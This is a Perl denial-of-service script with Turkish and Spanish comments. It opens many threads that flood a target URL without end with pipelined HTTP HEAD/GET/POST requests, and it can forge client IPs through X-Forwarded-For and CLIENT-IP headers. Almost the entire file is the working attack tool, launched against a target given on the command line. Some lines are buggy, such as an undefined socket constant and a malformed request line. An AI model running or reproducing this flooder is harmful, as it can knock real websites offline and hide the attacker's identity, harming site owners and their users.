#!/usr/bin/perl
package control;

my $ip;


sub new { #idk who is this shit
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas { # IP CREATOR
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("No mas IPs!\n") if($a>=255); 
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;

my $ua = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"; 
my $method = "HEAD";
my $methodx = "GET"; #
my $methodz = "POST"; #
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z','ş','ç','ı',0,1,2,3,4,5,6,7,8,9); #
my $randsemilla = "";
for($i = 0; $i < 51; $i++) { #Burası @vals daki yazılan harfler 0, 30 arası bir cümle oluşturuyor ex:(abababab) (st3st3tg353tg!)   
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker { #socker'ı Tanımlamış
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('udp'); 
    socket(SOCK, F_INET, SOCK_STREAM, $proto);    #####PF_INET changed == AF_INET
    connect(SOCK, $paddr) || return false; 
    return SOCK;
}


sub sender { # adı üstünde sender
    my ($max,$puerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'udp');  
        unless($sock) {
            print "\n[x] Siteye Girilmiyor...\n\n";
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) { # basit request işlemi
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g; 
            $paquete .= join "",$method," ",$methodx," ",$methodz," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        } # HEAD/ GET /POST ACK ;  #methodx POST #methodz GET
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\n[x] Siteye Girilmiyor...\n\n";
            next;
        }
        print $sock $paquete;
    }
}

sub comenzar { # KILL Bolumu
    $SIG{'KILL'} = sub { print "Killed...\n"; threads->exit(); }; 
    $url = $ARGV[0];
    print "URL: ".$url."\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "[-]Invalid arg 3...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] Invalid URL!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    print join "","[!] Başlıyor ",$max," threads!\n";
    $file = "/".$file if($file !~ /^\//);
    print join "","Target: ",$host,":",$puerto,"\nPath: ",$file,"\n\n";
    # entonces toca un paquete unico, no tiene caso que se genere por cada hilo :)...
    if($ipfake eq "") {
        # envio repetitivo
        my $paquetebase = join "",$method," /",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        # envio con ip... 
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
    }
    print "[-] Launched!\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "Fin!\n";
}


if($#ARGV > 2) {
    comenzar();
} else {
    die("Use: script.pl [url] [Connections] [Requests per connection] [Initial false IP (optional)]\n");
}